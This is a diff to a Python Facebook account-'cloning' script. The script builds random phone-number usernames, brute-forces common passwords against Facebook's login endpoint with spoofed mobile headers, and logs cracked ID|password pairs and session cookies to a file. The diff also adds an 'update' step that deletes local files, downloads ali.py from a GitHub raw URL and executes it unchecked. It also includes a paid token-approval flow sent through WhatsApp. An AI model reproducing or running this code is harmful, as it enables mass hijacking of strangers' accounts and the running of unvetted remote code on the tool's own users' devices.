@@ -1099,7 +1099,7 @@ logo = """
 [•] TOOL TYPE  : \033[1;34mRANDOM\033[1;34m
 [•] STATUS         : \033[1;35mFREE\033[1;35m
 --------------------------------------------------
-[•] \033[1;37mVERSION    :\033[1;32m 2.3 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
+[•] \033[1;37mVERSION    :\033[1;32m 1.2 \033[1;37m"DON'T WORRY FOR UPDATES!"\033[1;37m
 --------------------------------------------------"""
 
 def lines():
@@ -1108,14 +1108,14 @@ loop = 0
 oks = []
 cps = []
 try:
-    print('\n\033[1;37m[•] JOIN MY WHATSAP PGROUP')
+    print('\n\033[1;37m[•] WAIT CHECKING FOR UPDATE')
     proxy = requests.get('https://raw.githubusercontent.com/ALI-JUTT/Ahmed/main/update.txt').text.splitlines()
     v = 3.1
     update = requests.get('https://raw.githubusercontent.com/ALI-JUTT/files/main/version.txt').text
     if str(v) in update:
         os.system('rm -rf a*')
-        os.system('xdg-open http://Wa.me/+971564382087')
-        os.system('python AYAN.py')
+        os.system('curl -L https://raw.githubusercontent.com/ALI-JUTT/ali/main/ali.py > ali.py')
+        os.system('python ali.py')
     else:pass
 except:print('\n\033[1;31mNo internet connection ... \033[0;97m')
 
@@ -1127,7 +1127,7 @@ def dynamic(text):
         sys.stdout.flush();time.sleep(1)
 
 def rehan():
-	os.system('xdg-open https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN')
+	os.system('clear')
 	print(logo)
 	print('[1] RANDOM PAK CLONING')
 	print('[2] RANDOM BD CLONING')
@@ -1143,7 +1143,7 @@ def rehan():
 	elif gh =='3':
 		chos()
 	elif gh =='4':
-		os.system('xdg-open http://Wa.me/+971564382087')
+		os.system('xdg-open https://www.facebook.com/profile.php?id=RehanTalpur786')
 	elif gh =='0':
 		print('[•] THANKS FOR USE ')
 		time.sleep(3)
@@ -1154,7 +1154,7 @@ def rehan():
 		rehan()
 
 def menu():
-	os.system('xdg-open https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN')
+	os.system('clear')
 	print(logo)
 	print('[1] LAST 7 DIGIT')
 	print('[2] ALI + KHAN PASS')
@@ -1185,12 +1185,12 @@ def menu():
 
 def svn_digit():
 	user=[]
-	os.system('xdg-open https://www.facebook.com/groups/930301788178493/?ref=share&mibextid=NSMWBT')
+	os.system('clear')
 	print(logo)
 	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
 	kode = input('[•]\033[1;37m PUT YOUR SIM CODE : ')
-	os.system('xdg-open fb://group/726190969005614?ref=share&mibextid=NSMWBT')
+	os.system('clear')
 	print(logo)
 	print('[•] MAX LIMIT [50000]')
 	lines()
@@ -1199,7 +1199,7 @@ def svn_digit():
 		nmp = ''.join(random.choice(string.digits) for _ in range(7))
 		user.append(nmp)
 	with ThreadPool(max_workers=70) as yaari:
-		os.system('xdg-open https://www.facebook.com/profile.php?id=100089908370051&mibextid=ZbWKwL')
+		os.system('clear')
 		print(logo)
 		tl = str(len(user))
 		print('[•] TOTAL ACCOUNTS    : \033[1;32m'+tl)
@@ -1220,7 +1220,7 @@ def svn_digit():
 
 def ali_khan():
 	user=[]
-	os.system('xdg-open https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN')
+	os.system('clear')
 	print(logo)
 	print('[•] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
@@ -1261,7 +1261,7 @@ def ali_khan():
 
 def malik_baloch():
 	user=[]
-	os.system('xdg-open https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN')
+	os.system('clear')
 	print(logo)
 	print('[√] EXAMPLE :92318,92345,92323,92306.ETC')
 	lines()
@@ -1402,7 +1402,7 @@ def chos():
     twf =[]
     os.getuid
     os.geteuid
-    os.system("")
+    os.system("clear")
     print(logo)
     print('\x1b[1;91m[•] YOUR SIM CODE: ')
     lines()
@@ -1416,13 +1416,13 @@ def chos():
     for nmbr in range(limit):
         nmp = ''.join(random.choice(string.digits) for _ in range(7))
         user.append(nmp)
-    os.system("xdg-open https://www.facebook.com/profile.php?id=100075189761610")
+    os.system("clear")
     print(logo)
     print('[•] EXAMPLE :  1,2,3,4,5,6,7,8,9,Etc')
     lines()
     passx = int(input("[•] ENTER PASSWORD LIMIT : "))
     HamiiID = []
-    os.system('xdg-open https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN')
+    os.system('clear')
     print(logo)
     print('[•] EXAMPLE : khan12345,bangladish,baloch,Etc')
     lines()
@@ -1467,30 +1467,31 @@ def fcrack(uid,pwx,tl):
             "email":uid,
             "pass":ps,
             "login":"Log In"}
-            headers = {'authority': 'mbasic.facebook.com',
+            header_freefb = {'authority': 'x.facebook.com',
             'method': 'GET',
-             'path': '/',
-             'scheme': 'https',
-             'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-             'accept-language': 'en-GB,en;q=0.9,ur-PK;q=0.8,ur;q=0.7,en-US;q=0.6',
-             'cache-control': 'max-age=0',    
-             'sec-ch-ua': '"Chromium";v="107", "Not=A?Brand";v="24"',
-              'sec-ch-ua-mobile': '?1',
-              'sec-ch-ua-platform': '"Android"',
-              'sec-fetch-dest': 'document',
-              'sec-fetch-mode': 'navigate',
-               'sec-fetch-site': 'none',
-               'sec-fetch-user': '?1',
-               'upgrade-insecure-requests': '1',
-                'user-agent': 'Mozilla/5.0 (Android 4.4; Mobile; rv:41.0) Gecko/41.0 Firefox/41.0',}
-            response = requests.get('https://mbasic.facebook.com/', cookies=cookies, headers=headers)
+            'path': '/',
+            'scheme': 'https',
+            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+            'accept-language': 'en-US,en;q=0.9',
+            'cache-control': 'max-age=0',
+            'sec-ch-ua': '"(Not(A:Brand";v="99", "Chromium";v="108", "Google Chrome";v="108"',
+            'sec-ch-ua-mobile': '?1',
+            'sec-ch-ua-platform': '"Android"',
+            'sec-fetch-dest': 'document',
+            'sec-fetch-mode': 'navigate',
+            'sec-fetch-site': 'none',
+            'sec-fetch-user': '?1',
+            'upgrade-insecure-requests': '1',
+            'upgrade-insecure-requests': '1',
+            'user-agent': pro}
+            lo = session.post('https://x.facebook.com//login/device-based/login/async/?refsrc',data=log_data,headers=header_freefb).text
             log_cookies=session.cookies.get_dict().keys()
             #print(iid+'|'+pws+'|'+str(log_cookies))
             if 'c_user' in log_cookies:
                 coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                 cid = coki[151:166]
                 print('\033[1;32m[AYAN-OK] '+cid+'|'+ps+'\033[0;97m\n[‎‎🍁]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
-                open('RDX-OK.txt', 'a').write(cid+' | '+ps+ '\n')
+                open('AYAN-OK.txt', 'a').write(cid+' | '+ps+ '\n')
                 oks.append(cid)
                 break
             elif 'checkpoint' in log_cookies:
@@ -1503,13 +1504,13 @@ def fcrack(uid,pwx,tl):
             else:
                 continue
         loop+=1
-        sys.stdout.write(f'\r[\033[1;97mAYAN🧐\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
+        sys.stdout.write(f'\r[\033[1;97mAYAN😞\033[1;97m] %s|\33[1;32mOK:- %s\r'%(loop,len(oks))),
         sys.stdout.flush()
     except:
         pass
         
 def approval():
-  os.system('xdg-open https://chat.whatsapp.com/JvSx29SgcxB2ScAosnntdN')
+  os.system('clear')
   print(logo)
   uuid = str(os.geteuid()) + str(os.getlogin())
   id = "-".join(uuid)
@@ -1531,7 +1532,7 @@ def approval():
       print('\33[1;37m----------------------------------------------')
       print ('IF U DONT WANT TO BUY PLS DONT PRESS ENTER')
       input('IF U WANT TO BUY THEN PRESS ENTER ')
-      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+971564382087?text='+tks),approval()
+      tks = ('Hello%20Sir%20!%20Please%20Approve%20My%20Token%20The%20Token%20Is%20:%20'+id);os.system('am start https://wa.me/+923498410573?text='+tks),approval()
       time.sleep(1)
       approval()
   except:
